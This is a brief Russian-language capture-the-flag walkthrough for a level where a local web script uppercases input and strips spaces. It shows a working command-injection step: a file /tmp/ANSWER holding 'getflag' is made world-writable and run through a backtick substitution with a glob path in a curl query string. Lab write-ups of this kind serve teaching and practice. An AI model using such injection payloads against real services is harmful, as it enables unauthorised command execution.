Читаем скрипт, понимаем, что он преобразует маленькие буквы в большие и удаляет пробелы.
Создаем файл большими буквами, который содержит команду getflag.
echo "getflag > /tmp/token12" > /tmp/ANSWER
Даем кучу прав
chmod 777 /tmp/ANSWER
Курлом отправляем запрос с таким аргументом, чтобы программа его не изменила
curl http://localhost:4646?x=\`/*/ANSWER\`
cat /tmp/token12
